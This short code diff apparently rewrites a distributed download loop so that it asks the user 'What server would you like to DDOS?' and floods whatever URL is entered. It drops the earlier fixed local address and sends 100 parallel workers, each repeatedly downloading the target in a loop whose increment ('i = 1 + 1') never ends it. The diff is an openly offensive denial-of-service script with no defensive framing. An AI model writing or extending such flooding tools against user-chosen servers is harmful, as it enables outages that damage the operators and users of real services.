@@ -1,7 +1,8 @@
 
-urlList = List.map(List.range(0,100), x -> {return "http://192.168.1.100:3000"; });
+print("What server would you like to DDOS?");
+url = read();
 
-distribute(urlList, url -> {
+distribute(List.populate(url, 100), url -> {
 	for(i = 0; i < 1000; i = 1 + 1) {
 		download(url);
 	}
